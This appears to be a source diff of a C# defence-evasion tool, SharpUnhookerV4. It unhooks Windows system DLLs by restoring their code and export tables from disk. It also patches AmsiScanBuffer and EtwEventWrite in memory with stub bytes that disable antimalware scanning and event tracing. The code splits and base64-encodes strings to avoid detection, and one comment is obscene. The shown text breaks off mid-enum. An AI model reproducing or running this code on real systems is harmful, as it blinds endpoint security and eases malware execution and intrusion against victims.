@@ -387,7 +387,7 @@ public class PEReader
 
 }
 
-public class DInvokeCore {
+public class Dynavoke {
     // Required NTSTATUSs 
     public enum NTSTATUS : uint {
         // Success
@@ -745,85 +745,83 @@ public class DInvokeCore {
             ref UInt32 OldProtect);
     }
 
-    private static IntPtr GetLibraryAddress(string DLLName, string FunctionName) {
-        IntPtr hModule = GetLoadedModuleAddress(DLLName);
-        if (hModule == IntPtr.Zero) {
-            throw new DllNotFoundException(DLLName + ", Dll was not found or not loaded.");
+    public static bool ValidateString(string string1)
+    {
+        List<string> invalidChars = new List<string>() { "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "?", "+" };
+        // Check for length
+        if (string1.Length > 100)
+        {
+            return false;
         }
-        IntPtr lastOutput = GetExportAddress(hModule, FunctionName);
-        return lastOutput;
-    }
-
-    private static IntPtr GetLoadedModuleAddress(string DLLName) {
-        Process CurrentProcess = Process.GetCurrentProcess();
-        foreach (ProcessModule Module in CurrentProcess.Modules) {
-            if (string.Compare(Module.ModuleName, DLLName, true) == 0) {
-                IntPtr ModuleBasePointer = Module.BaseAddress;
-                return ModuleBasePointer;
-            }
+        else if (!(!string1.Equals(string1.ToLower())))
+        {
+            //Check for min 1 uppercase
+            return false;
         }
-        return IntPtr.Zero;
-    }
-
-    private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName) {
-        IntPtr FunctionPtr = IntPtr.Zero;
-        try {
-            // Traverse the PE header in memory
-            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
-            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
-            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
-            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
-            Int64 pExport = 0;
-            if (Magic == 0x010b) {
-                pExport = OptHeader + 0x60;
-            }
-            else {
-                pExport = OptHeader + 0x70;
-            }
-
-            // Read -> IMAGE_EXPORT_DIRECTORY
-            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
-            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
-            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
-            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
-            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
-            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
-            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
-
-            // Loop the array of export name RVA's
-            for (int i = 0; i < NumberOfNames; i++) {
-                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
-                if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase)) {
-                    Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
-                    Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
-                    FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
-                    break;
+        else 
+        {
+            //Iterate your list of invalids and check if input has one
+            foreach(string s in invalidChars)
+            {
+                if(string1.Contains(s))
+                {
+                    return false;
                 }
             }
+            return true;
         }
-        catch {
-            // Catch parser failure
-            throw new InvalidOperationException("Failed to parse module exports.");
-        }
+    }
 
-        if (FunctionPtr == IntPtr.Zero) {
-            // Export not found
-            throw new MissingMethodException(ExportName + ", export not found.");
+    public static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName) {
+        IntPtr FunctionPtr = IntPtr.Zero;
+        if (ValidateString(ExportName)) {
+            try {
+                // Traverse the PE header in memory
+                Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
+                Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
+                Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
+                Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
+                Int64 pExport = 0;
+                if (Magic == 0x010b) {
+                    pExport = OptHeader + 0x60;
+                }
+                else {
+                    pExport = OptHeader + 0x70;
+                }
+
+                // Read -> IMAGE_EXPORT_DIRECTORY
+                Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
+                Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
+                Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
+                Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
+                Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
+                Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
+                Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
+
+                // Loop the array of export name RVA's
+                for (int i = 0; i < NumberOfNames; i++) {
+                    string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
+                    if (FunctionName.Equals(ExportName, StringComparison.OrdinalIgnoreCase)) {
+                        Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
+                        Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
+                        FunctionPtr = (IntPtr)((Int64)ModuleBase + FunctionRVA);
+                        break;
+                    }
+                }
+            }
+            catch {
+                // Catch parser failure
+                throw new InvalidOperationException("Failed to parse module exports.");
+            }
+
+            if (FunctionPtr == IntPtr.Zero) {
+                // Export not found
+                throw new MissingMethodException(ExportName + " not found.");
+            }
+        }else {
+            throw new InvalidOperationException(ExportName + "contains illegal character!");
         }
         return FunctionPtr;
-    }
-
-    public static object DynamicAPIInvoke(string DLLName, string FunctionName, Type FunctionDelegateType, ref object[] Parameters) {
-        IntPtr pFunction = GetLibraryAddress(DLLName, FunctionName);
-        if (pFunction == IntPtr.Zero) {
-            throw new InvalidOperationException("Could not get the handle for the function.");
-        }
-        return DynamicFunctionInvoke(pFunction, FunctionDelegateType, ref Parameters);
-    }
-
-    private static object DynamicFunctionInvoke(IntPtr FunctionPointer, Type FunctionDelegateType, ref object[] Parameters) {
-        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(FunctionPointer, FunctionDelegateType);
-        return funcDelegate.DynamicInvoke(Parameters);
     }
 
     public static bool NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, UInt32 NewProtect, ref UInt32 OldProtect) {
@@ -831,23 +829,22 @@ public class DInvokeCore {
         OldProtect = 0;
         object[] funcargs = { ProcessHandle, BaseAddress, RegionSize, NewProtect, OldProtect };
 
-        NTSTATUS retValue = (NTSTATUS)DynamicAPIInvoke(@"ntdll.dll", @"NtProtectVirtualMemory", typeof(Delegates.NtProtectVirtualMemory), ref funcargs);
-        if (retValue != NTSTATUS.Success)
-        {
+        // get NtProtectVirtualMemory's pointer
+        IntPtr NTDLLHandleInMemory = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
+        IntPtr pNTPVM = GetExportAddress(NTDLLHandleInMemory, "NtProtectVirtualMemory");
+        // dynamicly invoke NtProtectVirtualMemory
+        Delegate funcDelegate = Marshal.GetDelegateForFunctionPointer(pNTPVM, typeof(Delegates.NtProtectVirtualMemory));
+        NTSTATUS NTSTATUS = (NTSTATUS)funcDelegate.DynamicInvoke(funcargs);
+
+        if (NTSTATUS != NTSTATUS.Success) {
             return false;
         }
-
         OldProtect = (UInt32)funcargs[4];
         return true;
     }
 }
 
 public class PatchAMSIAndETW {
-
-    static byte[] x64_etw_patch = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };
-    static byte[] x86_etw_patch = new byte[] { 0x33, 0xc0, 0xc2, 0x14, 0x00 };
-    static byte[] x64_amsi_patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-    static byte[] x86_amsi_patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
 
     // Thx D/Invoke!
     private static IntPtr GetExportAddress(IntPtr ModuleBase, string ExportName) {
@@ -898,62 +895,88 @@ public class PatchAMSIAndETW {
         return FunctionPtr;
     }
 
-	private static string decode(string b64encoded) {
-		return System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String(b64encoded));
-	}
-
-	private static void PatchMem(byte[] patch, string library, string function) {
+	private static void PatchETW() {
 		try {
             IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
-			IntPtr libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => library.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
-			IntPtr funcPtr = GetExportAddress(libPtr, function);
-            IntPtr patchLength = new IntPtr(patch.Length);
+			IntPtr libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => "ntdll.dll".Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress);
+			byte[] patchbyte = new byte[0];
+            if (IntPtr.Size == 4) {
+                string patchbytestring2 = "33,c0,c2,14,00";
+                string[] patchbytestring = patchbytestring2.Split(',');
+                patchbyte = new byte[patchbytestring.Length];
+                for (int i = 0; i < patchbytestring.Length; i++) {
+                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
+                }
+            }else {
+                string patchbytestring2 = "48,33,C0,C3";
+                string[] patchbytestring = patchbytestring2.Split(',');
+                patchbyte = new byte[patchbytestring.Length];
+                for (int i = 0; i < patchbytestring.Length; i++) {
+                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
+                }
+            }
+            IntPtr funcPtr = GetExportAddress(libPtr, ("Et" + "wE" + "ve" + "nt" + "Wr" + "it" + "e"));
+            IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
             UInt32 oldProtect = 0;
-            DInvokeCore.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchLength, 0x40, ref oldProtect);
-			Marshal.Copy(patch, 0, funcPtr, patch.Length);
+            Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, 0x40, ref oldProtect);
+            Marshal.Copy(patchbyte, 0, funcPtr, patchbyte.Length);
+            UInt32 newProtect = 0;
+            Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, oldProtect, ref newProtect);
+            Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("WysrK10gIUVUVyBQQVRDSEVEISBbKysrXQ==")));
 		}catch (Exception e) {
 			Console.WriteLine(" [!] {0}", e.Message);
 			Console.WriteLine(" [!] {0}", e.InnerException);
 		}
 	}
 
-	private static void PatchAMSI(byte[] patch) {
-		string dll = decode("YW1zaS5kbGw=");
-        foreach (ProcessModule CurrentModule in (Process.GetCurrentProcess().Modules)) {
-            if (CurrentModule.ModuleName == dll) {
-                PatchMem(patch, dll, ("Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er"));
+    private static void PatchAMSI() {
+        try {
+            IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
+            byte[] patchbyte = new byte[0];
+            if (IntPtr.Size == 4) {
+                string patchbytestring2 = "B8,57,00,07,80,C2,18,00";
+                string[] patchbytestring = patchbytestring2.Split(',');
+                patchbyte = new byte[patchbytestring.Length];
+                for (int i = 0; i < patchbytestring.Length; i++) {
+                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
+                }
+            }else {
+                string patchbytestring2 = "B8,57,00,07,80,C3";
+                string[] patchbytestring = patchbytestring2.Split(',');
+                patchbyte = new byte[patchbytestring.Length];
+                for (int i = 0; i < patchbytestring.Length; i++) {
+                    patchbyte[i] = Convert.ToByte(patchbytestring[i], 16);
+                }
             }
+            IntPtr libPtr;
+            try{ libPtr = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => (System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("YW1zaS5kbGw="))).Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress); }catch{ libPtr = IntPtr.Zero; }
+            if (libPtr != IntPtr.Zero) {
+                IntPtr funcPtr = GetExportAddress(libPtr, ("Am" + "si" + "Sc" + "an" + "Bu" + "ff" + "er"));
+                IntPtr patchbyteLength = new IntPtr(patchbyte.Length);
+                UInt32 oldProtect = 0;
+                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, 0x40, ref oldProtect);
+                Marshal.Copy(patchbyte, 0, funcPtr, patchbyte.Length);
+                UInt32 newProtect = 0;
+                Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref funcPtr, ref patchbyteLength, oldProtect, ref newProtect);
+                Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("WysrK10gIUFNU0kgUEFUQ0hFRCEgWysrK10=")));
+            }else {
+                Console.WriteLine(System.Text.ASCIIEncoding.ASCII.GetString(System.Convert.FromBase64String("WypdICFBTVNJLkRMTCBOT1QgREVURUNURUQhIFsqXQo=")));
+            }
+        }catch (Exception e) {
+            Console.WriteLine(" [!] {0}", e.Message);
+            Console.WriteLine(" [!] {0}", e.InnerException);
         }
-	}
+    }
 
-	private static void PatchETW(byte[] Patch) {
-		PatchMem(Patch, ("n" + "t" + "d" + "l" + "l" + "." + "d" + "l" + "l"), ("Et" + "wE" + "ve" + "nt" + "Wr" + "it" + "e"));
-	}
-
-	public static void Main() {
-		bool isit64bit;
-		if (IntPtr.Size == 4) {
-			isit64bit = false;
-		}else {
-			isit64bit = true;
-		}
-		if (isit64bit) {
-			PatchAMSI(x64_amsi_patch);
-			Console.WriteLine(decode("WysrK10gIUFNU0kgUEFUQ0hFRCEgWysrK10="));
-			PatchETW(x64_etw_patch);
-			Console.WriteLine(decode("WysrK10gIUVUVyBQQVRDSEVEISBbKysrXQ=="));
-		}else {
-			PatchAMSI(x86_amsi_patch);
-			Console.WriteLine(decode("WysrK10gIUFNU0kgUEFUQ0hFRCEgWysrK10="));
-			PatchETW(x86_etw_patch);
-			Console.WriteLine(decode("WysrK10gIUVUVyBQQVRDSEVEISBbKysrXQ=="));
-		}
-	}
+    public static void Main() {
+        PatchAMSI();
+        PatchETW();
+    }
 }
 
 public class SharpUnhooker {
 
-    public static void Unhooker(string DLLname) {
+    public static bool Unhooker(string DLLname) {
     	Console.WriteLine("Unhooking Sequence For {0} Started!", DLLname);
         IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
     	// get original .text section from original DLL
@@ -986,7 +1009,7 @@ public class SharpUnhooker {
                             Console.WriteLine("Updating memory protection setting...");
                             UInt32 oldProtect = 0;
                             IntPtr assemblyBytesLength = new IntPtr(OriginalDLLBytes.Length);
-                            bool updateMemoryProtection = DInvokeCore.NtProtectVirtualMemory(CurrentProcessHandle, ref InMemoryTextSectionPointer, ref assemblyBytesLength, 0x40, ref oldProtect);
+                            bool updateMemoryProtection = Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref InMemoryTextSectionPointer, ref assemblyBytesLength, 0x40, ref oldProtect);
                             if (updateMemoryProtection) {
                                 Console.WriteLine("Yay!Memory protection setting updated!");
                                 Console.WriteLine("Applying patch...");
@@ -1000,39 +1023,45 @@ public class SharpUnhooker {
                                     Marshal.Copy(readPatchedAPI, InMemoryTextSectionAfterPatched, 0, (int)OriginalDLL.ImageSectionHeaders[TextSectionNumber].SizeOfRawData);
                                     bool checkInMemoryTextSectionAfterPatched = InMemoryTextSectionAfterPatched.SequenceEqual(OriginalDLLBytes);
                                     UInt32 newProtect = 0;
-                                    DInvokeCore.NtProtectVirtualMemory(CurrentProcessHandle, ref InMemoryTextSectionPointer, ref assemblyBytesLength, oldProtect, ref newProtect);
+                                    Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref InMemoryTextSectionPointer, ref assemblyBytesLength, oldProtect, ref newProtect);
                                     if (!checkInMemoryTextSectionAfterPatched) {
                                         Console.WriteLine("[-] Patched DLL Bytes Doesnt Match With Desired DLL Bytes! API Is Probably Still Hooked! [-]");
+                                        return false;
                                     }else {
-                                        Console.WriteLine("[+++] Chill Out,Everything Is Fine.Which Means API Is Unhooked! [+++]");
+                                        Console.WriteLine("[+++] {0} IS UNHOOKED!", DLLname.ToUpper());
+                                        return true;
                                     }
                                 }else {
                                     Console.WriteLine("[-] Failed to patch DLL [-]");
+                                    return false;
                                 }
                             }else {
                                 Console.WriteLine("[-] Failed to update memory protection setting! [-]");
+                                return false;
                             }
                         }else {
                             Console.WriteLine("[-] Failed to get handle of in-memory DLL! [-]");
+                            return false;
                         }
                     }else {
                         Console.WriteLine("[-] Reading original DLL from disk failed! [-]");
+                        return false;
                     }
                 }
             }
+            return false;
         }else {
             Console.WriteLine("DLL is not loaded,Skipping...");
+            return true;
         }
     }
 
-    public static void SilentUnhooker(string DLLname) {
-    	Console.WriteLine("Unhooking Sequence For {0} Started!", DLLname);
+    public static bool SilentUnhooker(string DLLname) {
         IntPtr CurrentProcessHandle = new IntPtr(-1); // pseudo-handle for current process handle
     	// get original .text section from original DLL
     	string DLLFullPath;
         try { DLLFullPath = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => DLLname.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName); }catch{ DLLFullPath = null; }
 		if (DLLFullPath != null) {
-            Console.WriteLine("{0} is located on {1}", DLLname, DLLFullPath);
             byte[] DLLBytes = System.IO.File.ReadAllBytes(DLLFullPath);
             PEReader OriginalDLL = new PEReader(DLLBytes);
             for (int i = 0; i < OriginalDLL.FileHeader.NumberOfSections; i++) {
@@ -1050,55 +1079,229 @@ public class SharpUnhooker {
                             IntPtr InMemoryTextSectionPointer = ModuleHandleInMemory + (int)OriginalDLL.ImageSectionHeaders[TextSectionNumber].VirtualAddress;
                             UInt32 oldProtect = 0;
                             IntPtr assemblyBytesLength = new IntPtr(OriginalDLLBytes.Length);
-                            bool updateMemoryProtection = DInvokeCore.NtProtectVirtualMemory(CurrentProcessHandle, ref InMemoryTextSectionPointer, ref assemblyBytesLength, 0x40, ref oldProtect);
+                            bool updateMemoryProtection = Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref InMemoryTextSectionPointer, ref assemblyBytesLength, 0x40, ref oldProtect);
                             if (updateMemoryProtection) {
                                 bool PatchApplied = true;
                                 try{ Marshal.Copy(OriginalDLLBytes, 0, InMemoryTextSectionPointer, OriginalDLLBytes.Length); }catch{ PatchApplied = false; }
-                                if (PatchApplied == true) {
+                                if (PatchApplied) {
                                     byte[] InMemoryTextSectionAfterPatched = new byte[OriginalDLL.ImageSectionHeaders[TextSectionNumber].SizeOfRawData];
                                     IntPtr readPatchedAPI = InMemoryTextSectionPointer;
                                     Marshal.Copy(readPatchedAPI, InMemoryTextSectionAfterPatched, 0, (int)OriginalDLL.ImageSectionHeaders[TextSectionNumber].SizeOfRawData);
                                     bool checkInMemoryTextSectionAfterPatched = InMemoryTextSectionAfterPatched.SequenceEqual(OriginalDLLBytes);
                                     UInt32 newProtect = 0;
-                                    DInvokeCore.NtProtectVirtualMemory(CurrentProcessHandle, ref InMemoryTextSectionPointer, ref assemblyBytesLength, oldProtect, ref newProtect);
+                                    Dynavoke.NtProtectVirtualMemory(CurrentProcessHandle, ref InMemoryTextSectionPointer, ref assemblyBytesLength, oldProtect, ref newProtect);
                                     if (!checkInMemoryTextSectionAfterPatched) {
                                         Console.WriteLine("[-] Patched DLL Bytes Doesnt Match With Desired DLL Bytes! DLL Is Probably Still Hooked! [-]");
+                                        return false;
                                     }else {
-                                        Console.WriteLine("[+++] API IS UNHOOKED! [+++]");
+                                        Console.WriteLine("[+++] {0} IS UNHOOKED!", DLLname.ToUpper());
+                                        return true;
                                     }
                                 }else {
                                     Console.WriteLine("[-] Failed to patch in-memory DLL [-]");
+                                    return false;
                                 }
                             }else {
                                 Console.WriteLine("[-] Failed to update memory protection setting! [-]");
+                                return false;
                             }
                         }else {
                             Console.WriteLine("[-] Failed to get handle of in-memory DLL! [-]");
+                            return false;
                         }
                     }else {
                         Console.WriteLine("[-] Reading original DLL from disk failed! [-]");
+                        return false;
                     }
                 }
             }
+            return false;
         }else {
             Console.WriteLine("DLL is not loaded,Skipping...");
+            return true;
+        }
+    }
+
+    public static void EATCleansing(string ModuleName) {
+        IntPtr ModuleBase = IntPtr.Zero;
+        try { ModuleBase = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => ModuleName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().BaseAddress); }catch {}
+        if (ModuleBase == IntPtr.Zero) {
+            Console.WriteLine("DLL is not loaded,Skipping...");
+        }else {
+            string ModuleFileName = (Process.GetCurrentProcess().Modules.Cast<ProcessModule>().Where(x => ModuleName.Equals(Path.GetFileName(x.FileName), StringComparison.OrdinalIgnoreCase)).FirstOrDefault().FileName);
+            byte[] ModuleRawByte = System.IO.File.ReadAllBytes(ModuleFileName);
+            // Traverse the PE header in memory
+            Int32 PeHeader = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + 0x3C));
+            Int16 OptHeaderSize = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + PeHeader + 0x14));
+            Int64 OptHeader = ModuleBase.ToInt64() + PeHeader + 0x18;
+            Int16 Magic = Marshal.ReadInt16((IntPtr)OptHeader);
+            Int64 pExport = 0;
+            if (Magic == 0x010b) {
+                pExport = OptHeader + 0x60;
+            }
+            else {
+                pExport = OptHeader + 0x70;
+            }
+            // prepare module clone
+            PEReader DiskModuleParsed = new PEReader(ModuleRawByte);
+            int RegionSize = DiskModuleParsed.Is32BitHeader ? (int)DiskModuleParsed.OptionalHeader32.SizeOfImage : (int)DiskModuleParsed.OptionalHeader64.SizeOfImage;
+            int SizeOfHeaders = DiskModuleParsed.Is32BitHeader ? (int)DiskModuleParsed.OptionalHeader32.SizeOfHeaders : (int)DiskModuleParsed.OptionalHeader64.SizeOfHeaders;
+            IntPtr OriginalModuleBase = Marshal.AllocHGlobal(RegionSize);
+            Marshal.Copy(ModuleRawByte, 0, OriginalModuleBase, SizeOfHeaders);
+            for (int i = 0; i < DiskModuleParsed.FileHeader.NumberOfSections; i++) {
+                IntPtr pVASectionBase = (IntPtr)((UInt64)OriginalModuleBase + DiskModuleParsed.ImageSectionHeaders[i].VirtualAddress);
+                Marshal.Copy(ModuleRawByte, (int)DiskModuleParsed.ImageSectionHeaders[i].PointerToRawData, pVASectionBase, (int)DiskModuleParsed.ImageSectionHeaders[i].SizeOfRawData);
+            }
+
+            // Read -> IMAGE_EXPORT_DIRECTORY
+            Int32 ExportRVA = Marshal.ReadInt32((IntPtr)pExport);
+            Int32 OrdinalBase = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x10));
+            Int32 NumberOfFunctions = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x14));
+            Int32 NumberOfNames = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x18));
+            Int32 FunctionsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x1C));
+            Int32 NamesRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x20));
+            Int32 OrdinalsRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + ExportRVA + 0x24));
+            Int32 FunctionsRVAOriginal = Marshal.ReadInt32((IntPtr)(OriginalModuleBase.ToInt64() + ExportRVA + 0x1C));
+
+            // eat my cock u fokin user32.dll
+            IntPtr TargetPtr = ModuleBase + FunctionsRVA;
+            IntPtr TargetSize = (IntPtr)(4 * NumberOfFunctions);
+            uint newProtect = 0;
+            Dynavoke.NtProtectVirtualMemory((IntPtr)(-1), ref TargetPtr, ref TargetSize, 0x40, ref newProtect);
+
+            // Loop the array of export RVA's
+            for (int i = 0; i < NumberOfFunctions; i++) {
+                string FunctionName = Marshal.PtrToStringAnsi((IntPtr)(ModuleBase.ToInt64() + Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + NamesRVA + i * 4))));
+                Int32 FunctionOrdinal = Marshal.ReadInt16((IntPtr)(ModuleBase.ToInt64() + OrdinalsRVA + i * 2)) + OrdinalBase;
+                Int32 FunctionRVA = Marshal.ReadInt32((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase))));
+                Int32 FunctionRVAOriginal = Marshal.ReadInt32((IntPtr)(OriginalModuleBase.ToInt64() + FunctionsRVAOriginal + (4 * (FunctionOrdinal - OrdinalBase))));
+                try { Marshal.WriteInt32(((IntPtr)(ModuleBase.ToInt64() + FunctionsRVA + (4 * (FunctionOrdinal - OrdinalBase)))), FunctionRVAOriginal); }catch {
+                    Console.WriteLine("[-] Failed to rewrite the EAT of {0} with RVA of {1} and function ordinal of {2}", FunctionName, FunctionRVA.ToString("X4"), FunctionOrdinal);
+                    break;
+                }
+            }
+            Marshal.FreeHGlobal(OriginalModuleBase);
+            Console.WriteLine("[+++] {0} EXPORTS ARE CLEANSED!", ModuleName.ToUpper());
         }
     }
 
     public static void Main() {
 		Console.WriteLine("[------------------------------------------]");
-    	Console.WriteLine("[SharpUnhookerV3 - C# Based WinAPI Unhooker]");
+    	Console.WriteLine("[SharpUnhookerV4 - C# Based WinAPI Unhooker]");
     	Console.WriteLine("[         Written By GetRektBoy724         ]");
     	Console.WriteLine("[------------------------------------------]");
     	Console.WriteLine("[++++++++++++!SEQUENCE=STARTED!++++++++++++]");
     	Console.WriteLine("----------PHASE 1 == API UNHOOKING----------");
         // you can add more in here,if you want
-        string[] ListOfDLLToUnhook = { "ntdll.dll", "kernel32.dll", "user32.dll", "kernelbase.dll", "advapi32.dll" };
+        string[] ListOfDLLToUnhook = { "ntdll.dll", "kernel32.dll", "kernelbase.dll", "advapi32.dll" };
         for (int i = 0; i < ListOfDLLToUnhook.Length; i++) {
             SilentUnhooker(ListOfDLLToUnhook[i]);
+            EATCleansing(ListOfDLLToUnhook[i]);
         }
     	Console.WriteLine("------PHASE 2 == PATCHING AMSI AND ETW------");
     	PatchAMSIAndETW.Main();
     	Console.WriteLine("[+++++++++++!SEQUENCE==FINISHED!+++++++++++]");
+    }
+}
+
+public class SUUsageExample {
+    [Flags]
+    public enum AllocationType : ulong
+    {
+        Commit = 0x1000,
+        Reserve = 0x2000,
+        Decommit = 0x4000,
+        Release = 0x8000,
+        Reset = 0x80000,
+        Physical = 0x400000,
+        TopDown = 0x100000,
+        WriteWatch = 0x200000,
+        LargePages = 0x20000000
+    };
+
+    [Flags]
+    public enum ACCESS_MASK : uint
+    {
+        DELETE = 0x00010000,
+        READ_CONTROL = 0x00020000,
+        WRITE_DAC = 0x00040000,
+        WRITE_OWNER = 0x00080000,
+        SYNCHRONIZE = 0x00100000,
+        STANDARD_RIGHTS_REQUIRED = 0x000F0000,
+        STANDARD_RIGHTS_READ = 0x00020000,
+        STANDARD_RIGHTS_WRITE = 0x00020000,
+        STANDARD_RIGHTS_EXECUTE = 0x00020000,
+        STANDARD_RIGHTS_ALL = 0x001F0000,
+        SPECIFIC_RIGHTS_ALL = 0x0000FFF,
+        ACCESS_SYSTEM_SECURITY = 0x01000000,
+        MAXIMUM_ALLOWED = 0x02000000,
+        GENERIC_READ = 0x80000000,
+        GENERIC_WRITE = 0x40000000,
+        GENERIC_EXECUTE = 0x20000000,
+        GENERIC_ALL = 0x10000000,
+        DESKTOP_READOBJECTS = 0x00000001,
+        DESKTOP_CREATEWINDOW = 0x00000002,
+        DESKTOP_CREATEMENU = 0x00000004,
+        DESKTOP_HOOKCONTROL = 0x00000008,
+        DESKTOP_JOURNALRECORD = 0x00000010,
+        DESKTOP_JOURNALPLAYBACK = 0x00000020,
+        DESKTOP_ENUMERATE = 0x00000040,
+        DESKTOP_WRITEOBJECTS = 0x00000080,
+        DESKTOP_SWITCHDESKTOP = 0x00000100,
+        WINSTA_ENUMDESKTOPS = 0x00000001,
+        WINSTA_READATTRIBUTES = 0x00000002,
+        WINSTA_ACCESSCLIPBOARD = 0x00000004,
+        WINSTA_CREATEDESKTOP = 0x00000008,
+        WINSTA_WRITEATTRIBUTES = 0x00000010,
+        WINSTA_ACCESSGLOBALATOMS = 0x00000020,
+        WINSTA_EXITWINDOWS = 0x00000040,
